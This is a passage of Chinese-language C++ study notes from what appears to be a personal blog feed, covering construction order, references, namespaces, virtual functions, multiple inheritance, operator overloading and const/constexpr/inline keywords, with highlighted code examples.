x,y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>(<span class="keyword">int</span> v):<span class="built_in">b</span>(v),<span class="built_in">y</span>(b+<span class="number">2</span>),<span class="built_in">x</span>(b+<span class="number">1</span>),<span class="built_in">d</span>(b),<span class="built_in">A</span>(v)&#123;<span class="comment">//这里构造顺序是按照上面的规则来的，而不是按初始化列表中的顺序</span></span><br><span class="line">        c=v;        std::cout&lt;&lt;b&lt;&lt;c&lt;&lt;d;       std::cout&lt;&lt;<span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">B</span>( )&#123; std::cout&lt;&lt;<span class="string">&quot;D&quot;</span>;&#125;		<span class="comment">//派生类成员实际构造顺序为b,d,x,y</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; <span class="function">B <span class="title">z</span><span class="params">(<span class="number">1</span>)</span></span>; &#125;	<span class="comment">//输出结果：123111CD321</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果虚基类和基类的构造函数无参，那么构造的时候可以不显式调用，编译程序会自动调用</p>
</li>
<li><p>如果引用变量r引用的是一个对象v，则对象的构造和析构由对象v完成，而不应该由引用变量r完成。<strong>如果被引用的对象是用new生成的，则引用变量r必须用delete &amp;r析构对象</strong>，否则被引用的对象将因无法完全释放空间（为对象申请的空间）而产生内存泄漏。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span>  i;    <span class="keyword">int</span> *s;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="keyword">int</span> x)&#123;</span><br><span class="line">        s=<span class="keyword">new</span> <span class="keyword">int</span>[i=x]; </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;(C): &quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">A</span>( ) &#123;</span><br><span class="line">        <span class="keyword">delete</span> s; </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;(D): &quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; </span><br><span class="line">    A &amp;p=*<span class="keyword">new</span> <span class="built_in">A</span>(<span class="number">1</span>);  </span><br><span class="line">&#125;<span class="comment">//内存泄露</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;  </span><br><span class="line">    A *q=<span class="keyword">new</span> <span class="built_in">A</span>(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="comment">//内存泄露</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub3</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    A &amp;p=*<span class="keyword">new</span> <span class="built_in">A</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">delete</span> &amp;p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub4</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    A *q=<span class="keyword">new</span> <span class="built_in">A</span>(<span class="number">4</span>);  </span><br><span class="line">    <span class="keyword">delete</span> q;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">sub1</span>( );    <span class="built_in">sub2</span>( );</span><br><span class="line">    <span class="built_in">sub3</span>( );    <span class="built_in">sub4</span>( );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果继承方式为公有继承，那么这种分别叫做父类和子类，父类指针可以直接指向子类，父类引用可以直接引用子类，所以具体到底是什么只能在运行的时候确定，但是，编译时将父类指针默认指向父类，所以访问的时候不能访问子类成员，因为它没有。而如果没有构成父子关系，则需要进行<strong>强制类型转换</strong>，如果出现同名函数，那么调用的将会是指针原型，而不是指针指向的对象</p>
</li>
<li><p>在派生类函数成员内部，定义的基类指针可以直接指向该派生类对象，而不用进行强制类型转换，而在派生类友元中，基类指针也可以直接指向派生类对象</p>
</li>
</ol>
<h1 id="可访问性"><a href="#可访问性" class="headerlink" title="可访问性"></a>可访问性</h1><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><ol>
<li><p>::运算符优先级和结合性与括号相同，在这里使用::主要是有时候可访问性带来的差异</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">POINT2D</span>&#123;</span></span><br><span class="line">	<span class="comment">//定义二维坐标点</span></span><br><span class="line">	    <span class="keyword">int</span>  x, y;   </span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	    <span class="comment">//获得点的二维x轴坐标</span></span><br><span class="line">	    <span class="function"><span class="keyword">int</span>  <span class="title">getx</span><span class="params">( )</span></span>;</span><br><span class="line">	    <span class="built_in">POINT2D</span> (<span class="keyword">int</span> x, <span class="keyword">int</span> y)&#123;</span><br><span class="line">	    <span class="comment">//int x访问优先于数据成员x</span></span><br><span class="line">	        POINT2D::x=x;    </span><br><span class="line">	        <span class="comment">//POINT2D::x为数据成员x </span></span><br><span class="line">	        POINT2D::y=y;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>所以也就是说，标识符作用域越小，可访问性越高，所以在上述类的构造函数中，由于重名，会优先访问函数参数中的x</p>
</li>
<li><p>当同一作用域的标识符名和类名相同时，可以在类前面加class、struct、union来加以区分</p>
</li>
</ol>
<h2 id="名字空间"><a href="#名字空间" class="headerlink" title="名字空间"></a>名字空间</h2><ol>
<li><p>名字空间需要在全局作用域中用namespace定义，最外层名字空间需要在全局作用域中唯一，不同名字空间中可以有相同的标识符，可以分多次定义，使用保留字using来使用名字空间，并且在引用某个成员之前，该成员必须在名字空间中被定义</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    <span class="comment">//不会引入其中的变量、函数或者类型到当前作用域</span></span><br><span class="line"><span class="keyword">namespace</span> ALPHA &#123;	<span class="comment">//初始定义ALPHA</span></span><br><span class="line">	    <span class="keyword">extern</span> <span class="keyword">int</span> x;	<span class="comment">//声明整型变量x</span></span><br><span class="line">	    <span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">int</span>)</span></span>;		<span class="comment">//声明函数原型void g(int)</span></span><br><span class="line">	    <span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">long</span>)</span> </span>&#123;	<span class="comment">//定义函数void g(long)</span></span><br><span class="line">	        cout &lt;&lt; <span class="string">&quot;Processing a long argument.\n&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">using</span> ALPHA::x;	<span class="comment">//声明引用变量x，引入到当前作用域</span></span><br><span class="line"><span class="keyword">using</span> ALPHA::g;	<span class="comment">//声明引用void g(int)和g(long)</span></span><br><span class="line"><span class="keyword">namespace</span> ALPHA &#123; 	<span class="comment">//扩展定义ALPHA</span></span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">5</span>;		<span class="comment">//定义整型变量x</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">int</span> a)</span> 		<span class="comment">//定义函数void g(int)</span></span></span><br><span class="line"><span class="function">    </span>&#123; cout &lt;&lt; <span class="string">&quot;Processing a int argument.\n&quot;</span>;   &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">(<span class="keyword">void</span>)</span> 		<span class="comment">//定义新的函数void g(void)</span></span></span><br><span class="line"><span class="function">    </span>&#123; cout &lt;&lt; <span class="string">&quot;Processing a void argument.\n&quot;</span>;  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">g</span>(<span class="number">4</span>);			<span class="comment">//调用函数void g(int)</span></span><br><span class="line">    <span class="built_in">g</span>(<span class="number">4L</span>);		<span class="comment">//调用函数void g(long)</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;X=&quot;</span>&lt;&lt;x;	<span class="comment">//访问整型变量x</span></span><br><span class="line">    <span class="built_in">g</span>(<span class="keyword">void</span>);		<span class="comment">//using之前无该 原型，失败</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>容易发现，访问名字空间中的成员有三种方式即直接访问、引用名字空间成员、引用名字空间</p>
<ul>
<li>直接访问，&lt;名字空间名称&gt;::&lt;成员名称&gt;</li>
<li>引用名字空间成员，using &lt;名字空间名称&gt;::&lt;成员名称&gt;。如果引用时只声明或定义了一部分重载函数原型，则只引用这些函数，并且引用时只能给出函数名，不能带函数参数。</li>
<li>引用名字空间，using namespace &lt;名字空间名称&gt;，其中所有的成员可用。多个名字空间成员同名时用作用域运算符限定。</li>
</ul>
</li>
<li><p>引用名字空间成员时，会直接将该成员添加到当前作用域，因此就无法定义同名的标识符，而引用名字空间时，没有将名字空间成员添加到当前标识符</p>
</li>
<li><p>可以为名字空间定义别名，一般时为了防止过多嵌套让可读性变差</p>
</li>
<li><p>对于匿名名字空间，其作用域为当前文件，名字空间被自动引用，成员定义不加入当前作用域，所以可以定义同名成员，但是一旦冲突的话，匿名名字空间中的东西就无法被访问</p>
</li>
</ol>
<h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><ol>
<li>内联的友元函数默认存储为static</li>
</ol>
<h2 id="覆盖与隐藏"><a href="#覆盖与隐藏" class="headerlink" title="覆盖与隐藏"></a>覆盖与隐藏</h2><ol>
<li>隐藏是指当基类成员与派生类成员同名时，通过派生类对象只能访问到派生类成员，而无法访问到基类成员，但是如果还能访问的话，称派生类成员覆盖了基类成员。</li>
<li>在派生类函数中，基类的保护和公开成员会被派生类同名成员覆盖</li>
<li>在派生类中， using特定基类数据成员后，不允许再在派生类中定义同名数据成员，并且可以通过前述using改变或指定新的访问权限。而using特定基类的函数成员的话是可以的。</li>
</ol>
<h1 id="虚函数与多态"><a href="#虚函数与多态" class="headerlink" title="虚函数与多态"></a>虚函数与多态</h1><ol>
<li>重载函数：静态多态与静态联编；虚函数：动态多态与动态联编。前者在编译时确定，后者在运行时确定。</li>
<li>虚函数必须是类的实例成员函数，在派生类中重新定义该成员函数时原型必须完全相同。<strong>构造函数不能定义成虚函数</strong>，在基类中定义过虚函数后，派生类中所有原型相同的函数自动成为虚函数，<strong>最好将普通成员函数全都定义成虚函数</strong></li>
<li>注意：如果为基类和派生类的对象分配了动态内存，或者为派生类的对象成员分配了动态内存，则一定要将基类和派生类的析构函数定义为虚析构函数，否则便可能造成内存泄漏，导致系统出现内存保护错误。</li>
<li>一个很重要的点就是如果类A内部有指针的话，应自定义A()、A(A&amp;&amp;) noexcept 、A(const A&amp;)、A&amp; operator=(const A&amp;)、 A&amp; operator=(A&amp;&amp;)noexcept以及~A()函数</li>
<li>对于<strong>纯虚函数</strong>，定义格式为<strong>virtual 函数原型=0</strong>，有this指针，所以不能用static修饰，另外函数体定义<strong>应在派生类中实现</strong>，使其成为非纯虚函数。定义了纯虚函数的类称为<strong>抽象类</strong>，抽象类一般用作派生类的基类，<strong>不能有对象或类实例</strong>，如果派生类中没有重新定义纯虚函数或者定义了别的纯虚函数，那它又变成了一个抽象类。通过抽象类指针或引用可调用抽象类的纯虚函数，根据多态性，实际调用的应是该类的非抽象派生类的虚函数。如果该派生类没有重新定义被调虚函数，则会导致程序出现不可意料的运行错误。调用抽象类的普通函数成员不会出现该问题。</li>
<li>malloc函数可以为抽象类分配空间，但是没有调用构造函数，纯虚函数一般不定义成别的函数的友元，因为它没有函数体，没什么意义，但是是可以的</li>
</ol>
<h1 id="多继承与虚基类"><a href="#多继承与虚基类" class="headerlink" title="多继承与虚基类"></a>多继承与虚基类</h1><ol>
<li><p>多继承有多个基类，在使用多继承的时候很容易产生命名冲突，见下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145416515.png" alt="image-20220326145416515"></p>
<p>这个时候类D继承了两份A的东西，即同一派生类多次初始化同一基类，一份从A-&gt;B-&gt;D过来，另一份从A-&gt;C-&gt;D过来，为了解决这个问题，我们需要使用<strong>虚基类</strong></p>
</li>
<li><p>同一派生树中的同名虚基类共享同一个储存空间，并且构造函数和析构函数仅执行一次，因此，<strong>构造函数尽量最早执行，析构函数尽量最晚执行</strong>，如果虚基类和基类重名的话会出现二义性访问的问题，可以使用作用域运算符来避免</p>
</li>
<li><p>构造顺序如下，<strong>考试重点</strong></p>
<ul>
<li>按定义顺序自左至右自下至上定义所有虚基类</li>
<li>按定义顺序构造所有直接基类</li>
<li>按定义顺序构造派生类所有数据成员</li>
<li>执行派生类构造函数</li>
</ul>
</li>
</ol>
<h1 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h1><ol>
<li><p>a++返回右值，大概是因为a++是先把a复制出来，然后再整体运算，即a=a+1，最后返回的还是之前的a</p>
</li>
<li><p>运算符有如下分类：</p>
<ul>
<li>不能重载的：sizeof、. 、.*、::、? :</li>
<li>只能重载为普通函数成员的：=、-&gt;、[]、()</li>
<li>不能重载为普通函数成员的：new、delete</li>
<li>其他运算符：都不能重载为静态函数成员，但可以重载为普通函数成员和普通函数。</li>
</ul>
</li>
<li><p>除了()之外一般重载运算符函数不能缺省参数，不改变原运算符优先级和结合性，并且<strong>重载时必须有一个参数代表对象！</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>;</span></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">operator</span>=(<span class="keyword">int</span>, A&amp;); <span class="comment">//错误，不能重载为普通函数</span></span><br><span class="line">A&amp; <span class="keyword">operator</span> +=(A&amp;,A&amp;);<span class="comment">//A*和A[ ]参数不代表对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">int</span> <span class="keyword">operator</span>=(<span class="keyword">int</span>,A&amp;); <span class="comment">//错误，不存在operator=</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">operator</span><span class="params">( )</span><span class="params">(A&amp;,<span class="keyword">int</span>)</span></span>; <span class="comment">//错误，不能为静态成员</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">int</span> <span class="keyword">operator</span>+(A&amp;,<span class="keyword">int</span>);  <span class="comment">//错误，不能为静态成员</span></span><br><span class="line">        <span class="keyword">friend</span> A&amp; <span class="keyword">operator</span> += (A&amp;,A&amp;);  <span class="comment">//正确</span></span><br><span class="line">        A&amp; <span class="keyword">operator</span> ++( );    <span class="comment">//隐含参数this代表一个对象</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>重载函数种类不同，参数表列出的参数个数也不同。当然也有些特例不符合下面的例子</p>
<ul>
<li>重载为普通函数：参数个数=运算符目数</li>
<li>重载为普通成员：参数个数=运算符目数 - 1 (即this指针)</li>
<li>重载为静态成员：参数个数 = 运算符目数(没有this指针)</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>编程语言</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++学习（二）</title>
    <url>/2021/12/06/C-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    目前是考过了csp，最终的成绩是215 :satisfied: ，第一次参加，也算是非常满意了。考试过程中也出现了种种意外，但总的来说就是有惊无险吧。</p>
<p>​    接下来这一周主要是复习C++的考试，STL的使用先放一放，主要着重于学习C++面向对象的一些特征，参考马光志老师的课件和《C++ Primer Plus》，主要记录一些自己不太熟悉的知识点。</p>
<h1 id="类型、常量、变量、函数"><a href="#类型、常量、变量、函数" class="headerlink" title="类型、常量、变量、函数"></a>类型、常量、变量、函数</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>​    这块和C语言基本一样，多了一个布尔类型。</p>
<p>​    <strong>自动类型转换路径：char→unsigned char→ short→unsigned short→ int→unsigned int→long→unsigned long→float→double→long double</strong></p>
<h2 id="变量及类型解析"><a href="#变量及类型解析" class="headerlink" title="变量及类型解析"></a>变量及类型解析</h2><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>​    用static在函数外部定义的为模块静态变量，可通过单目运算符::访问，而用static在函数内部定义的是局部静态变量，下面给一个例子</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x, y; <span class="comment">//模块静态变量x、y定义，默认初始值均为0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span>&#123;    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> y;       <span class="comment">//局部静态变量y定义， 初始值y=0</span></span><br><span class="line">    <span class="keyword">return</span>  ::y+x+y;<span class="comment">//分别访问模块静态变量y,模块静态变量x,局部静态变量y</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="几个关键字"><a href="#几个关键字" class="headerlink" title="几个关键字"></a>几个关键字</h3><p>​    这里主要讲的是const，constexpr，volatile，inline</p>
<p>​    首先对于<strong>const</strong>和<strong>constexpr</strong>，两者都是修饰只读变量，但是const没有区分这是编译期常量还是运行期常量，而constexpr会让编译器将当前变量当成编译期常量，也就是让编译器在编译时就可以对表达式进行一定的优化。const修饰成员函数表示该函数不会修改类的状态，而constexpr不能修饰成员函数，只能作为函数返回值类型，表示该函数返回的是一个编译时确定的值，而如果用constexpr修饰函数，返回值<strong>不一定是编译期常量</strong>，编译器会根据实际情况进行操作。</p>
<p>​    具体用constexpr修饰的函数，有以下几点注意事项：</p>
<ol>
<li><p>用constexpr定义的函数当其实参为常量时可以被更彻底的优化。</p>
</li>
<li><p>constexpr函数内不能有goto语句或标号，也不能有try语句块。</p>
</li>
<li><p>constexpr函数不能调用非constexpr的函数，如printf函数。</p>
</li>
<li><p>constexpr函数不能定义static变量、线程本地变量等永久期限变量。</p>
</li>
<li><p>类似inline函数，constexpr函数的函数体可能被优化掉，其作用域相当于static。</p>
</li>
<li><p>函数main为全局作用域，故不能定义为constexpr函数。</p>
</li>
</ol>
<p>​    两者在修饰变量的时候也有区别，const表示变量无法修改，但初值不确定，而constexpr修饰的变量必须用常量表达式初始化，见下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> sz = <span class="built_in">get_size</span>(); <span class="comment">// 虽然sz无法改变，但get_size() 编译阶段无法确定值，也就是说sz不是常量表达式</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> mf = <span class="number">20</span>; <span class="comment">// 字面量20是常量表达式</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> limit = mf + <span class="number">1</span>; <span class="comment">// mf + 1是常量表达式</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> sz = <span class="built_in">size</span>(); <span class="comment">// 只有当size是constexpr函数时，才是正确的</span></span><br></pre></td></tr></table></figure>
<p>​    下面说<strong>volatile</strong>，主要作用是进行多线程编程，在单线程中限制编译器优化，表示修饰的变量易变，故可以有<strong>const volatile int z=0</strong>这种写法。</p>
<p>​    然后是<strong>inline</strong>，在过去inline只能用在函数定义前，说明成内联函数，解决参数入栈出栈的开销，但是在C++17之后，inline也可以用来修饰变量。在C++17之前，要想在多个文件中使用同一个变量、函数的话，需要在头文件中声明，在源文件中定义，但是现在我们可以直接在头文件中用inline修饰想用的变量，这样就可以直接在头文件中定义了。另外对于静态数据成员，在C++17之后使用constexpr的时候就默认使用了inline，下面给一个例子</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//C++17之前的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">D</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> n = <span class="number">5</span>;<span class="comment">//仅仅是一个声明</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;D::n;<span class="comment">//这是对的，如果仅用值传递的话是没问题的，但是如果需要用到地址的话就会报错</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//C++之后就相当于直接定义了n</span></span><br></pre></td></tr></table></figure>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>​    首先先说明一下左值和右值的概念，这里的左值大概指的是可以取地址的值，右值是取不了地址的值</p>
<h3 id="有址引用"><a href="#有址引用" class="headerlink" title="有址引用"></a>有址引用</h3><ol>
<li><p>传统左值有址引用变量必须由同类型的传统左值表达式初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x=<span class="number">3</span>;<span class="keyword">int</span> &amp;y=x;<span class="comment">//正确</span></span><br><span class="line"><span class="keyword">char</span> x=<span class="string">&#x27;c&#x27;</span>;<span class="keyword">int</span> &amp;y=x;<span class="comment">//错误，因为首先进行强制类型转换(int)x，返回值是个右值</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>传统右值有址引用变量要用的传统右值表达式初始化，当然由于左值包含了右值，所以也可以用传统左值初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> u=<span class="number">4</span>;  <span class="keyword">const</span> <span class="keyword">int</span>&amp;v=u;<span class="comment">//用传统右值表达式u初始化v</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;w=<span class="number">4</span>;                      <span class="comment">//用传统右值表达式4初始化w</span></span><br><span class="line"><span class="keyword">int</span> x=<span class="number">3</span>;            <span class="keyword">const</span> <span class="keyword">int</span> &amp;z=x;<span class="comment">//用传统左值表达式x初始化z</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>传统左值有址引用变量共享被引用的传统左值的内存。理论上自己<strong>无内存</strong>，故不能定义传统左值有址引用变量去引用传统左值有址引用变量(无内存)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp; &amp;u;<span class="comment">//错，有址引用引用的变量没有地址可还行</span></span><br><span class="line"><span class="keyword">int</span> &amp; *v;<span class="comment">//错，因为指针v不能指向没有内存的int&amp;型</span></span><br><span class="line"><span class="keyword">int</span> x=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> &amp;y=x;<span class="comment">//对</span></span><br><span class="line"><span class="keyword">int</span> &amp;z=y;<span class="comment">//对，但不是z引用y，而是z和y都引用x</span></span><br><span class="line"><span class="keyword">int</span> &amp;a[<span class="number">2</span>];<span class="comment">//错，数组元素有内存</span></span><br><span class="line"><span class="keyword">int</span> s[<span class="number">6</span>];</span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (&amp;t)[<span class="number">6</span>]=s;<span class="comment">//对，数组有内存，可被引用</span></span><br><span class="line"><span class="comment">//位段无地址，无法被引用</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>由于引用在编译的时候被编译成了指针，所以对指针的种种使用可以推广到引用上。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;u=<span class="number">3</span>;   <span class="comment">//u是所引用单元值只读的引用</span></span><br><span class="line"><span class="keyword">int</span> &amp;v=u;	          <span class="comment">//错：u不能初始化所引用单元值可写的引用变量v	     </span></span><br><span class="line"><span class="keyword">int</span> x=<span class="number">3</span>; <span class="keyword">int</span> &amp;y=x;<span class="comment">//对：可进行y=4，则x=4。 </span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;z=y;    <span class="comment">//对：不可进行z=4。但若y=5，则x=5, z=5。</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> &amp;m=y;<span class="comment">//对：可有volatile有关指针的概念推广，m引用x</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="无址引用"><a href="#无址引用" class="headerlink" title="无址引用"></a>无址引用</h3><ol>
<li><p>传统左值无址引用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp;&amp;x=<span class="number">2</span>;</span><br><span class="line">x=<span class="number">3</span>;<span class="comment">//这是正确的</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>传统右值无址引用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;&amp;y=<span class="number">3</span>;</span><br><span class="line">y=<span class="number">4</span>;<span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>无址引用共享被引用对象的“缓存”，不分配内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp;&amp;  *p;	<span class="comment">//错：p不能指向没有内存的无址引用</span></span><br><span class="line"><span class="keyword">int</span> &amp;&amp;  &amp;q;	<span class="comment">//错：int &amp;&amp;没有内存，不能被q引用</span></span><br><span class="line"><span class="keyword">int</span> &amp;  &amp;&amp;r;	<span class="comment">//错：int &amp;没有内存，不能被r引用。</span></span><br><span class="line"><span class="keyword">int</span> &amp;&amp;  &amp;&amp;s;	<span class="comment">//错：int &amp;&amp;没有内存，不能被s引用</span></span><br><span class="line"><span class="keyword">int</span> &amp;&amp;t[<span class="number">4</span>];    	<span class="comment">//错：数组的元素不能为int &amp;&amp;：数组内存空间为0。</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;   <span class="built_in"><span class="keyword">int</span></span>(&amp;&amp; t)[<span class="number">3</span>]=a; <span class="comment">//错：a是有址右值, 有名(a)的均是有址的。 </span></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span>(&amp;&amp; u)[<span class="number">3</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;    <span class="comment">//正确，&#123;1，2，3&#125;是无址右值</span></span><br></pre></td></tr></table></figure>
<p>感觉上面的写法怪怪的….</p>
<p>大概捋了一下，引用指的应该是引用分配内存的量，而int&amp;这种类型没有被分配内存，它共享了被引用对象的内存，所以这种写法是不对的。另外就是，<strong>&amp;&amp;无法引用传统左值</strong></p>
</li>
<li><p>如果函数返回值不是有址引用，则默认返回无址</p>
</li>
</ol>
<h2 id="另外的一些类型"><a href="#另外的一些类型" class="headerlink" title="另外的一些类型"></a>另外的一些类型</h2><ol>
<li><p>枚举类型，和C语言里基本一致，如果使用<strong>enum class</strong>或者<strong>enum struct</strong>定义枚举类型，则访问其元素时必须使用类型名::限定元素名</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">struct</span> <span class="title">RND</span>&#123;</span>e=<span class="number">2</span>, f=<span class="number">0</span>, g, h&#125;;	<span class="comment">//正确：e=2，f=0，g=1，h= 2</span></span><br><span class="line">RND m= RND::h;			<span class="comment">//必须用限定名RND::h</span></span><br><span class="line"><span class="keyword">int</span>  n=<span class="built_in"><span class="keyword">sizeof</span></span>(RND::h);		<span class="comment">//n=4, 枚举元素实现为整数</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ol>
<li>函数声明结构如下</li>
</ol>
<p>​    <img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145313498.png" alt="image-20220326145313498"></p>
<ol>
<li><p>C++函数允许有省略参数…，表示后面可以接0到任意个任意类型的参数</p>
